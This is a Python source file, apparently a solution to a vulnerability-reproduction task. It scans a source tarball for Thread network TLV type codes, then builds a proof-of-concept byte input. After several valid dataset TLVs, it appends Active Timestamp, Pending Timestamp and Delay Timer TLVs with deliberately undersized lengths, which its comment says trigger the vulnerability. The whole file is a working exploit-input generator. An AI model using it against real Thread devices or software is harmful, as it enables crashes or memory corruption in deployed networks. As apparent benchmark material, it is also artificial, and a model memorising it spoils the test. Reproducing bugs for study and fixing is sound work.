import tarfile
import re


class Solution:
    def solve(self, src_path: str) -> bytes:
        tlv_map = self._extract_tlv_types(src_path)

        active_type = tlv_map.get('kActiveTimestamp', 14)
        pending_type = tlv_map.get('kPendingTimestamp', 51)
        delay_type = tlv_map.get('kDelayTimer', 52)

        channel_type = tlv_map.get('kChannel')
        panid_type = tlv_map.get('kPanId')
        extpan_type = tlv_map.get('kExtendedPanId')
        netname_type = tlv_map.get('kNetworkName')
        master_type = tlv_map.get('kNetworkMasterKey')
        if master_type is None:
            master_type = tlv_map.get('kNetworkKey')
        mlprefix_type = tlv_map.get('kMeshLocalPrefix')
        secpol_type = tlv_map.get('kSecurityPolicy')

        poc = bytearray()

        # Optional: add realistic, valid TLVs (only if we know their type codes)
        if channel_type is not None:
            # Channel TLV: page (1 byte) + channel (2 bytes) => length 3
            poc.append(channel_type & 0xFF)
            poc.append(3)
            # Page 0, channel 11 (0x000B)
            poc.extend([0x00, 0x00, 0x0B])

        if panid_type is not None:
            # PAN ID TLV: 2 bytes
            poc.append(panid_type & 0xFF)
            poc.append(2)
            poc.extend([0x12, 0x34])

        if extpan_type is not None:
            # Extended PAN ID TLV: 8 bytes
            poc.append(extpan_type & 0xFF)
            poc.append(8)
            poc.extend(b'\xAA\xBB\xCC\xDD\xEE\xFF\x00\x11')

        if netname_type is not None:
            # Network Name TLV: variable length (<= max), use short ASCII name
            name = b'OT-NET'
            poc.append(netname_type & 0xFF)
            poc.append(len(name))
            poc.extend(name)

        if master_type is not None:
            # Network Master Key TLV: 16 bytes
            poc.append(master_type & 0xFF)
            poc.append(16)
            poc.extend(b'\x01\x02\x03\x04\x05\x06\x07\x08'
                       b'\x09\x0A\x0B\x0C\x0D\x0E\x0F\x10')

        if mlprefix_type is not None:
            # Mesh Local Prefix TLV: 8 bytes
            poc.append(mlprefix_type & 0xFF)
            poc.append(8)
            poc.extend(b'\xFD\x00\xDB\x8E\x00\x00\x00\x00')

        if secpol_type is not None:
            # Security Policy TLV: length >= 2, use minimal
            poc.append(secpol_type & 0xFF)
            poc.append(2)
            poc.extend(b'\x00\x00')

        # Now append TLVs that trigger the vulnerability: invalid (too short) lengths

        # Active Timestamp TLV – should be 8 bytes, we give 1
        poc.append(active_type & 0xFF)
        poc.append(1)
        poc.append(0x00)

        # Pending Timestamp TLV – should be 8 bytes, we give 1
        poc.append(pending_type & 0xFF)
        poc.append(1)
        poc.append(0x00)

        # Delay Timer TLV – should be 4 bytes, we give 1
        poc.append(delay_type & 0xFF)
        poc.append(1)
        poc.append(0x00)

        return bytes(poc)

    def _extract_tlv_types(self, src_path: str) -> dict:
        mapping = {}
        try:
            with tarfile.open(src_path, 'r:*') as tf:
                for member in tf.getmembers():
                    if not member.isfile():
                        continue
                    name = member.name
                    if not (name.endswith('.hpp') or name.endswith('.h') or
                            name.endswith('.hh') or name.endswith('.hxx') or
                            name.endswith('.c') or name.endswith('.cc') or
                            name.endswith('.cpp') or name.endswith('.cxx')):
                        continue
                    f = tf.extractfile(member)
                    if f is None:
                        continue
                    try:
                        text = f.read().decode('utf-8', errors='ignore')
                    finally:
                        f.close()
                    if 'kActiveTimestamp' not in text and 'kPendingTimestamp' not in text and 'kDelayTimer' not in text:
                        continue
                    enum_map = self._parse_enums_for_tlvs(text)
                    mapping.update(enum_map)
                    if ('kActiveTimestamp' in mapping and
                            'kPendingTimestamp' in mapping and
                            'kDelayTimer' in mapping):
                        break
        except Exception:
            # On any failure, just fall back to hard-coded defaults.
            return {}
        return mapping

    def _parse_enums_for_tlvs(self, text: str) -> dict:
        names_of_interest = {
            'kChannel',
            'kPanId',
            'kExtendedPanId',
            'kNetworkName',
            'kNetworkMasterKey',
            'kNetworkKey',
            'kMeshLocalPrefix',
            'kSecurityPolicy',
            'kActiveTimestamp',
            'kPendingTimestamp',
            'kDelayTimer',
        }
        mapping: dict = {}
        pattern = re.compile(r'enum\s+(?:class\s+)?\w*\s*\{([^}]*)\}', re.DOTALL)
        for m in pattern.finditer(text):
            body = m.group(1)
            if not any(name in body for name in names_of_interest):
                continue
            enum_mapping = self._parse_enum_body(body)
            for n in names_of_interest:
                if n in enum_mapping and n not in mapping:
                    mapping[n] = enum_mapping[n]
        return mapping

    def _parse_enum_body(self, body: str) -> dict:
        mapping: dict = {}
        last_val = None
        # Remove block comments to simplify parsing
        body = re.sub(r'/\*.*?\*/', '', body, flags=re.DOTALL)
        entries = body.split(',')
        for entry in entries:
            e = entry.strip()
            if not e:
                continue
            # Remove line comments
            e = e.split('//')[0].strip()
            if not e:
                continue
            m = re.match(r'(?P<name>k\w+)(\s*=\s*(?P<val>.+))?$', e)
            if not m:
                continue
            name = m.group('name')
            val_expr = m.group('val')
            if val_expr is not None:
                val_expr = val_expr.strip()
                m_num = re.match(r'^(0x[0-9a-fA-F]+|\d+)$', val_expr)
                if m_num:
                    value = int(m_num.group(1), 0)
                    last_val = value
                    mapping[name] = value
                else:
                    # Complex expression; skip assigning numeric value
                    continue
            else:
                if last_val is None:
                    value = 0
                else:
                    value = last_val + 1
                last_val = value
                mapping[name] = value
        return mapping